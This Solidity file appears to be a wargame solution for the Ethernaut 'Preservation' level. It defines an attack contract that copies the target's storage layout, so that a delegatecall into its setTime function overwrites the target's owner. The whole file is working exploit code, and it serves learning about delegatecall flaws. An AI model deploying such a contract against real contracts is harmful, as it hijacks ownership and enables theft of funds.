// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

/// @title AttackPreservation
/// @author IbCaOs
contract AttackPreservation {

    // The target contract's address that the attacker aims to exploit.
    address constant target = 0xA5DB1DfEC68DF8d5fBDd46f02755108ecb7249d6;

    // These state variables are designed to match the layout of the state variables in the target "Preservation" contract.
    // This is crucial because delegatecall maintains the context of the calling contract's storage.
    address public timeZone1Library;
    address public timeZone2Library;
    address public owner; 
    uint storedTime;

    // This function attempts to exploit the delegatecall vulnerability in the target contract by overwriting its "owner" state variable.
    // When "setTime" is invoked via delegatecall, it will not modify the "storedTime" of the target but rather the "owner" due to the matching storage layout.
    function setTime(uint _time) public {
        owner = address(uint160(_time));
    }
}
